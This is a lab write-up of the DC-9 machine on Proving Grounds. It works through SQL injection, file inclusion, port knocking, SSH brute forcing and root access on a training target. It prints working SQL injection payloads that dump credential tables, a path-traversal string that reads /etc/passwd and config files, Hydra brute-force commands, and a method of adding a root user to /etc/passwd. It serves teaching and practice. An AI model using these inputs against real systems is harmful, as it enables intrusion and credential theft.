# DC-9: Walkthrough

## Overview
**Machine Name**: DC-9
**Platform**: Proving Grounds
**Difficulty**: Medium
**OS**: Linux (Debian 9)
**Focus**: SQL Injection (UNION-based), Local File Inclusion (LFI), Port Knocking, Hydra SSH Brute Forcing, Priv Esc via Custom SUID/Writable Scripts

## Enumeration
### Network Discovery
An Nmap sweep was performed to locate the target machine IP address: `192.168.62.209`.
![](screenshots/Pasted%20image%2020260615181458.png)

### Port Scanning
A full TCP port scan was performed:
```bash
nmap -T4 -A -p- 192.168.62.209
```
Results:
| Port | Service | Version |
| --- | --- | --- |
| 22/tcp | ssh | filtered (OpenSSH 7.9p1) |
| 80/tcp | http | Apache httpd 2.4.38 (Debian) |

### Web & SQL Injection Enumeration
Accessing the HTTP service on port 80 shows a search form under "Staff Details":
![](screenshots/Pasted%20image%2020260615181629.png)
![](screenshots/Pasted%20image%2020260615181726.png)

A SQL injection vulnerability was found in the search input box. Putting `' or 1=1 -- ` returned all records.
1. Determining column count:
   `' or 1=1 ORDER BY 6 -- -` (Confirmed 6 columns)
2. Database version/name check:
   `' or 1=1 UNION SELECT NULL,version(),NULL,NULL,NULL,NULL -- -`
   ![](screenshots/Pasted%20image%2020260615184218.png)
3. Extracting tables:
   `' or 1=1 UNION SELECT NULL,TABLE_NAME,NULL,NULL,NULL,NULL FROM information_schema.tables -- -`
   ![](screenshots/Pasted%20image%2020260615184529.png)
   Discovered tables: `Users` and `UserDetails`.
4. Extracting columns of the `Users` table:
   `' or 1=1 UNION SELECT NULL,COLUMN_NAME,NULL,NULL,NULL,NULL FROM information_schema.columns WHERE TABLE_NAME='Users'-- -`
   ![](screenshots/Pasted%20image%2020260615184843.png)
5. Dumping login credentials from `Users`:
   `' or 1=1 UNION SELECT NULL,UserID,Username,Password,NULL,NULL FROM Users-- -`
   ![](screenshots/Pasted%20image%2020260615185110.png)

The password hashes were extracted. Checking them against online databases failed:
![](screenshots/Pasted%20image%2020260615185223.png)

The hash type was identified as MD5-crypt/bcrypt/etc. using `hashid`:
![](screenshots/Pasted%20image%2020260615185900.png)

Cracking the hash with `john` yielded the admin password:
![](screenshots/Pasted%20image%2020260615185942.png)

Logging in as `admin` allowed access to a management console. A Reflected XSS was tested successfully:
![](screenshots/Pasted%20image%2020260615190656.png)

### Local File Inclusion (LFI)
The management console has a file inclusion vulnerability in the `file` parameter:
`?file=../../../../../../etc/passwd`
![](screenshots/Pasted%20image%2020260615191537.png)
![](screenshots/Pasted%20image%2020260615191857.png)

No SSH private keys were found in the users' home directories via Burp Intruder LFI fuzzing:
![](screenshots/Pasted%20image%2020260615192605.png)

To gather more system credentials, the SQL injection was used to target the table `UserDetails` inside the schema `users` (as the current active schema was `Staff`):
```sql
' or 1=1 UNION SELECT NULL, username, password, NULL, NULL, NULL FROM users.UserDetails -- -
```
![](screenshots/Pasted%20image%2020260615192949.png)

## Exploitation
### Port Knocking
SSH (port 22) was reported as filtered. Using LFI, the `/etc/knockd.conf` file was read to retrieve the port knocking instructions:
![](screenshots/Pasted%20image%2020260615195554.png)

Executing the knocking sequence:
```bash
nmap -Pn -r -p 7469,8475,9842 --max-retries 0 --scan-delay 1s 192.168.62.209
```
![](screenshots/Pasted%20image%2020260615195918.png)
The SSH port was opened successfully.

### SSH Brute Force
Hydra was run against SSH using the username and password lists dumped from the `users.UserDetails` table:
```bash
hydra -L username.txt -P password.txt -t 4 ssh://192.168.62.209
```
![](screenshots/Pasted%20image%2020260615201455.png)

Successful logins were achieved for three users:
```bash
ssh <user>@192.168.62.209
```
![](screenshots/Pasted%20image%2020260615201738.png)

## Privilege Escalation
### Lateral Movement
None of the three logged-in users had sudo privileges:
![](screenshots/Pasted%20image%2020260615201835.png)

Local enumeration revealed a list of credentials inside the home directory of the user `janitor`:
![](screenshots/Pasted%20image%2020260615202235.png)

These passwords were added to the credentials list, and Hydra was run again:
![](screenshots/Pasted%20image%2020260615203108.png)

This matched credentials for the user `fredf`. Logging in as `fredf`:
```bash
ssh fredf@192.168.62.209
```

### Sudo/Script Execution Hijack
Enumerate sudo privileges for `fredf`:
```bash
sudo -l
```
![](screenshots/Pasted%20image%2020260615203222.png)
Fredf was allowed to execute a custom test script/binary located in `devstuff` as root.

Examining the `devstuff` directory revealed the source code of the executable, which appends lines to files:
![](screenshots/Pasted%20image%2020260615203742.png)

### Root Access
The executable was used to append a new root user `newroot` directly to `/etc/passwd`:
![](screenshots/Pasted%20image%2020260615204355.png)

Switching to `newroot`:
```bash
su newroot
whoami
root
```
![](screenshots/Pasted%20image%2020260615204459.png)

## Post-Exploitation
### Flag Recovery
- User Flag (`/home/fredf/local.txt`):
  ![](screenshots/Pasted%20image%2020260615203454.png)
- Root Flag (`/root/proof.txt`):
  ![](screenshots/Pasted%20image%2020260615204459.png)

## Lessons Learned
1. Fully qualify cross-database schema targets during SQL injection if the target table lies outside the default active database context.
2. If SSH is filtered, check `/etc/knockd.conf` via LFI/RCE and trigger the knock sequence to dynamically open access.
3. Restrict Sudo permissions on executables that write/append to files, as they can be used to hijack `/etc/passwd` or `/etc/shadow`.
